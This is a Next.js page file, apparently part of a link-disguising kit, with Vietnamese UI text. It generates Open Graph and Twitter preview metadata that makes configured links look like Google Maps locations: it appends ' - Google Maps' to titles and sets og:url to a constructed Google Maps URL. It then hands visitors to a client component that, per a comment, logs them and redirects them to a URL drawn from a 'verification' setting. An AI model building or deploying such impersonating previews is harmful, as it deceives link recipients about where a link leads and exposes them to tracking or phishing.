import type { Metadata, ResolvingMetadata } from 'next';
import { getMapLinksAction, type MapLinkConfig } from '@/app/actions/map-links';
import { MapRedirectClient } from '@/components/map-redirect-client';
import { notFound } from 'next/navigation';
import { getVerificationConfigAction } from '@/app/actions/settings';

type Props = {
  params: { id: string }
}

async function getLinkConfig(id: string): Promise<MapLinkConfig | undefined> {
  const links = await getMapLinksAction();
  return links.find(link => link.id === id);
}

export async function generateMetadata(
  { params }: Props,
  parent: ResolvingMetadata
): Promise<Metadata> {
  const config = await getLinkConfig(params.id);

  if (!config) {
    return {
      title: 'Không tìm thấy vị trí'
    }
  }
 
  const previousImages = (await parent).openGraph?.images || []

  const title = `${config.title} - Google Maps`;
  // Construct a plausible Google Maps URL for og:url
  const googleMapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(config.title)}`;

  return {
    title: title,
    description: config.description,
    openGraph: {
      title: title,
      description: config.description,
      images: [
        {
          url: config.imageUrl,
          width: 1200,
          height: 630,
        },
        ...previousImages
      ],
      type: 'website',
      url: googleMapsUrl, // Add the desired og:url
    },
    twitter: {
      card: "summary_large_image",
      title: title,
      description: config.description,
      images: [config.imageUrl],
    },
  }
}

export default async function MapPreviewPage({ params }: Props) {
  const config = await getLinkConfig(params.id);

  if (!config) {
    notFound();
  }
  
  // Get the final redirect URL from the main settings
  const verificationConfig = await getVerificationConfigAction();
  const redirectUrl = verificationConfig.redirectUrl;


  // The client component will now handle UI, logging, and the final redirection.
  return <MapRedirectClient redirectUrl={redirectUrl} config={config} />;
}
